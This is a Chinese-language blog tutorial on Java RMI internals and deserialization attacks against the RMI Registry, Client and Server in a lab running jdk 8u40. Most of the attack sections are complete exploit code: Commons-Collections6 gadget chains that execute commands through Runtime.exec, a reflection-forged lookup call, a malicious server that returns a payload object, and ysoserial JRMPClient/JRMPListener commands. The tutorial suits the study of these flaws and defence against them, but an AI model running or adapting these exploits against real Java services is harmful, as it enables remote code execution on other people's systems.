---
title: "Java RMI 安全"
date: 2022-11-20T20:27:08+08:00
lastmod: 2022-11-20T20:27:08+08:00
draft: false
author: "X1r0z"

tags: ['rmi']
categories: ['Java 安全']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

快速过一遍 RMI 安全基础

<!--more-->

当然还有一些细节没涉及到, 比如如何用 RASP hook 指定方法, JRMPClient 和 JRMPListener 的实现原理, DGC 层反序列化, JEP 290 的绕过等等, 只能慢慢填坑了...

## RMI 基础

### 基本概念

> Java 远程方法调用，即 Java RMI (Java Remote Method Invocation) 是 Java 编程语言里, 一种用于实现远程过程调用的应用程序编程接口. 它使客户机上运行的程序可以调用远程服务器上的对象. 远程方法调用特性使 Java 编程人员能够在网络环境中分布操作. RMI 全部的宗旨就是尽可能简化远程接口对象的使用.

RMI 利用 JRMP 协议进行通信, 过程中存在三个角色

- Registry: 注册中心, 负责维护一个 Map, 其中存放了远程对象的名称和实例, 服务端从注册中心注册对象, 客户端从注册中心获取对象
- Client: 客户端, 调用远程对象的一方, 会从注册中心获取对象, 并最终与服务端通信
- Server: 服务端, 实现了相应的远程对象, 在接收到 Client 的请求后, 会在本地调用已实现的方法并且将执行结果返回给客户端

在早期版本的 jdk 中, Registry 和 Server 可以不在同一台服务器上, 但是高版本的 jdk 要求 Registry 和 Server 必须是同一台服务器

### 快速上手

环境为 jdk 8u40

#### Server

Server 需要先编写远程对象的接口, 该接口必须继承自 Remote 接口, 其中的方法必须抛出 RemoteException

```java
interface Hello extends Remote{
    public void world() throws RemoteException;
}
```

然后编写实现这个接口的类, 该类必须继承自 UnicastRemoteObject 类, 并且需要调用其构造函数

```java
class HelloImpl extends UnicastRemoteObject implements Hello{

    protected HelloImpl() throws RemoteException {
        super();
    }

    @Override
    public void world() throws RemoteException {
        System.out.println("hello world");
    }
}
```

#### Registry

Registry 通过 `LocateRegistry.createRegisry()` 方法创建, 之后通过 bind 方法绑定对应的实例化类

```java
public class Server {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);
        Hello helloImpl = new HelloImpl();
        registry.bind("hello", helloImpl);
    }
}
```

#### Client

Client 需要编写与 Server 一样的接口

```java
interface Hello extends Remote{
    public void world() throws RemoteException;
}
```

然后执行 `LocateRegistry.getRegistry()` 连接到 Registry, 并通过 lookup 方法得到远程对象, 最后执行对应方法

```java
public class Client {
    public static void main(String[] args) throws Exception{

        Registry registry = LocateRegistry.getRegistry("192.168.100.1", 1099);
        Hello hello = (Hello) registry.lookup("hello");
        hello.world();
    }
}
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211201750784.png)

### 实现原理

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211201753331.png)

参考文章

[https://paper.seebug.org/1251/](https://paper.seebug.org/1251/)

[https://blog.csdn.net/u013630349/article/details/51954161](https://blog.csdn.net/u013630349/article/details/51954161)

[https://www.cnblogs.com/yin-jingyu/archive/2012/06/14/2549361.html](https://www.cnblogs.com/yin-jingyu/archive/2012/06/14/2549361.html)

上面源码分析的非常详细, 这里我就简单说一下

Client Registry Server 间的通信其实是通过 Stub 和 Skeleton 两个代理对象来实现的

Stub 是对远程接口的实现, 它的方法里封装了与 Server 端 Skeleton 对象的通信过程, 负责将参数传输给 Skeleton 并返回执行结果

Skeleton 代理了实际被调用的远程对象, 同样封装了与 Client 端 Stub 对象的通信过程, 负责接收 Stub 传递的参数, 调用实际远程对象的方法并将执行结果传输给 Stub

对于 Registry 存在 RegistryImpl\_Stub 和 RegistryImpl\_Skel 两个代理对象

Client / Server 通过 RegistryImpl\_Stub 来向 Registry 执行 bind 之类的操作

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211201803837.png)

Registry 通过 RegistryImpl\_Skel 来处理 RegistryImpl\_Stub 的请求

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211201805172.png)

这里重点关注 dispatch 方法, 该方法是处理请求的核心

```java
public void dispatch(Remote var1, RemoteCall var2, int var3, long var4) throws Exception {
    if (var4 != 4905912898345647071L) {
        throw new SkeletonMismatchException("interface hash mismatch");
    } else {
        RegistryImpl var6 = (RegistryImpl)var1;
        String var7;
        Remote var8;
        ObjectInput var10;
        ObjectInput var11;
        switch (var3) {
            case 0:
                try {
                    var11 = var2.getInputStream();
                    var7 = (String)var11.readObject();
                    var8 = (Remote)var11.readObject();
                } catch (IOException var94) {
                    throw new UnmarshalException("error unmarshalling arguments", var94);
                } catch (ClassNotFoundException var95) {
                    throw new UnmarshalException("error unmarshalling arguments", var95);
                } finally {
                    var2.releaseInputStream();
                }

                var6.bind(var7, var8);

                try {
                    var2.getResultStream(true);
                    break;
                } catch (IOException var93) {
                    throw new MarshalException("error marshalling return", var93);
                }
            case 1:
                var2.releaseInputStream();
                String[] var97 = var6.list();

                try {
                    ObjectOutput var98 = var2.getResultStream(true);
                    var98.writeObject(var97);
                    break;
                } catch (IOException var92) {
                    throw new MarshalException("error marshalling return", var92);
                }
            case 2:
                try {
                    var10 = var2.getInputStream();
                    var7 = (String)var10.readObject();
                } catch (IOException var89) {
                    throw new UnmarshalException("error unmarshalling arguments", var89);
                } catch (ClassNotFoundException var90) {
                    throw new UnmarshalException("error unmarshalling arguments", var90);
                } finally {
                    var2.releaseInputStream();
                }

                var8 = var6.lookup(var7);

                try {
                    ObjectOutput var9 = var2.getResultStream(true);
                    var9.writeObject(var8);
                    break;
                } catch (IOException var88) {
                    throw new MarshalException("error marshalling return", var88);
                }
            case 3:
                try {
                    var11 = var2.getInputStream();
                    var7 = (String)var11.readObject();
                    var8 = (Remote)var11.readObject();
                } catch (IOException var85) {
                    throw new UnmarshalException("error unmarshalling arguments", var85);
                } catch (ClassNotFoundException var86) {
                    throw new UnmarshalException("error unmarshalling arguments", var86);
                } finally {
                    var2.releaseInputStream();
                }

                var6.rebind(var7, var8);

                try {
                    var2.getResultStream(true);
                    break;
                } catch (IOException var84) {
                    throw new MarshalException("error marshalling return", var84);
                }
            case 4:
                try {
                    var10 = var2.getInputStream();
                    var7 = (String)var10.readObject();
                } catch (IOException var81) {
                    throw new UnmarshalException("error unmarshalling arguments", var81);
                } catch (ClassNotFoundException var82) {
                    throw new UnmarshalException("error unmarshalling arguments", var82);
                } finally {
                    var2.releaseInputStream();
                }

                var6.unbind(var7);

                try {
                    var2.getResultStream(true);
                    break;
                } catch (IOException var80) {
                    throw new MarshalException("error marshalling return", var80);
                }
            default:
                throw new UnmarshalException("invalid method number");
        }

    }
}
```

switch 中每一个 case 分别对应不同的操作, 关系如下

- 0: bind
- 1: list
- 2: lookup
- 3: rebind
- 4: unbind

其中 bind rebind unbind lookup 的操作中都存在对 readObject 方法的调用, 为后面的反序列化漏洞打下了基础

## RMI 反序列化

### 攻击 Registry

#### bind & rebind

bind 和 rebind 过程中 Registry 会执行 readObject, 存在反序列化漏洞

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211201840259.png)

其中 var7 为对象名称, var8 为对象本身

下面以 cc6 为例构造 Client 端的 payload

```java
package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.Serializable;
import java.lang.reflect.*;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.HashMap;
import java.util.Map;


public class Client {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
                new ConstantTransformer(1)
        };

        Transformer transformerChain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)});

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");

        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue");
        outerMap.remove("keykey");

        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, transformers);

        Registry registry = LocateRegistry.getRegistry("192.168.100.1", 1099);
        registry.bind("test", new Wrapper(expMap));
    }
}

class Wrapper implements Remote, Serializable {
    private Object obj;

    public Wrapper(Object obj) {
        this.obj = obj;
    }
}
```

注意 expMap 本身不继承自 Remote 接口, 需要自己写一个包装类

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211201842809.png)

#### unbind & lookup

unbind 和 lookup 方法也会调用 readObject, 不过必须是 String 类型

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211201845070.png)

根据 seebug 文章的思路, 有两种方法绕过: 伪造连接请求和利用 rasp hook 修改发送数据

这里我用的是前者, 因为 rasp 目前还没学到... (太菜了)

以 lookup 为例, 来看一下 RegistryImpl\_Stub 的 lookup 方法

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211201848686.png)

invoke 后面的代码都是读取 Registry 返回的对象

大致的思路就是通过反射拿到 ref operations 这几个属性, 然后通过 writeObject 写入 payload, 最后调用 invoke 发送数据

```java
package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.ObjectOutput;
import java.io.Serializable;
import java.lang.reflect.*;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.Operation;
import java.rmi.server.RemoteCall;
import java.rmi.server.RemoteObject;
import java.rmi.server.RemoteRef;
import java.util.HashMap;
import java.util.Map;


public class Client {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
                new ConstantTransformer(1)
        };

        Transformer transformerChain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)});

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");

        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue");
        outerMap.remove("keykey");

        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, transformers);

        Registry registry = LocateRegistry.getRegistry("192.168.100.1", 1099);

        Field refField = registry.getClass().getSuperclass().getSuperclass().getDeclaredField("ref");
        refField.setAccessible(true);
        RemoteRef ref = (RemoteRef) refField.get(registry);

        Field operationsField = registry.getClass().getDeclaredField("operations");
        operationsField.setAccessible(true);
        Operation[] operations = (Operation[]) operationsField.get(registry);

        RemoteCall var2 = ref.newCall((RemoteObject) registry, operations, 2, 4905912898345647071L);

        ObjectOutput var3 = var2.getOutputStream();
        var3.writeObject(new Wrapper(expMap));

        ref.invoke(var2);
    }
}

class Wrapper implements Remote, Serializable {
    private Object obj;

    public Wrapper(Object obj) {
        this.obj = obj;
    }
}
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211201855435.png)

#### JRMPClient

ysoserial 提供了 JRMPClient 这个 **exploit** 来攻击 Registry, 它的原理是利用 RMI 的 DGC 层进行反序列化

利用方式如下

```bash
java -cp ysoserial-all.jar ysoserial.exploit.JRMPClient 192.168.100.1 1099 CommonsCollections6 "calc.exe"
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211202007239.png)

### 攻击 Client

#### 通过 Registry 攻击 (JRMPListener)

原理是当 Client 调用 Registry 的 lookup / list 方法时, RegistryImpl\_Skel 会进行 writeObject, 那么在 Client 端一定会出现 readObject, 从而造成反序列化漏洞

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211201958144.png)

ysoserial 提供了 JRMPListener 这个 **exploit** 来攻击 Client (当然也可以 rasp hook 或手工伪造 Registry response)

利用方式如下

```bash
java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 "calc.exe"
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211202005077.png)

#### 通过 Server 攻击

有两种情况, 一种是利用 codebase 远程加载对象, 另一种是远程接口中存在返回值为 Object 的方法

前者利用条件太苛刻了, 而且需要手动指定 policy, 所以下面以后者为例

原理也很简单, 当返回值为 Object 时, 在传输的过程中 Server 必然会对其进行序列化, 自然而然地 Client 也会对传输过来的数据进行反序列化

编写 Server

```java
package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.Field;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.UnicastRemoteObject;
import java.util.HashMap;
import java.util.Map;


public class Server {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);
        Hello helloImpl = new HelloImpl();
        registry.bind("hello", helloImpl);
    }
}

interface Hello extends Remote{
    public Object world() throws RemoteException, NoSuchFieldException, IllegalAccessException;
}

class HelloImpl extends UnicastRemoteObject implements Hello{

    protected HelloImpl() throws RemoteException {
        super();
    }

    @Override
    public Object world() throws RemoteException, NoSuchFieldException, IllegalAccessException {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
                new ConstantTransformer(1)
        };

        Transformer transformerChain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)});

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");

        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue");
        outerMap.remove("keykey");

        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, transformers);

        return expMap;

    }
}
```

编写 Client (需要调用指定方法)

```java
package org.example;

import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;


public class Client {
    public static void main(String[] args) throws Exception{

        Registry registry = LocateRegistry.getRegistry("192.168.100.1", 1099);
        Hello hello = (Hello) registry.lookup("hello");
        hello.world();
    }
}

interface Hello extends Remote{
    public Object world() throws RemoteException, NoSuchFieldException, IllegalAccessException;
}
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211202016322.png)

### 攻击 Server

与 Server 攻击 Client 一样, 被调用的接口方法中需要存在 Object 类型的参数, 这样 Server 端会对传输过来的数据进行反序列化

编写 Client

```java
package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.Field;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.HashMap;
import java.util.Map;


public class Client {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
                new ConstantTransformer(1)
        };

        Transformer transformerChain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)});

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");

        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue");
        outerMap.remove("keykey");

        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, transformers);

        Registry registry = LocateRegistry.getRegistry("192.168.100.1", 1099);
        Hello hello = (Hello) registry.lookup("hello");
        hello.world(expMap);
    }
}

interface Hello extends Remote{
    public void world(Object obj) throws RemoteException;
}
```

编写 Server

```java
package org.example;

import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.UnicastRemoteObject;

public class Server {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);
        Hello helloImpl = new HelloImpl();
        registry.bind("hello", helloImpl);
    }
}

interface Hello extends Remote{
    public void world(Object obj) throws RemoteException;
}

class HelloImpl extends UnicastRemoteObject implements Hello{

    protected HelloImpl() throws RemoteException {
        super();
    }

    @Override
    public void world(Object obj) throws RemoteException{
        System.out.println(obj.toString());

    }
}
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211202020024.png)

### 绕过 JEP 290

高版本 jdk 引入了 JEP 290 策略, 并在 Client 与 Registry 的通信过程中默认设置了 registryFilter, 使得只有在白名单里面的类才能够被反序列化

绕过 JEP 290 有很多种方法, 仔细研究的话又是一个深坑...

这里就先放几篇参考文章

[https://paper.seebug.org/1251/#jep-290-jep290](https://paper.seebug.org/1251/#jep-290-jep290)

[https://paper.seebug.org/1194/#jep290](https://paper.seebug.org/1194/#jep290)

[https://xz.aliyun.com/t/7932](https://xz.aliyun.com/t/7932)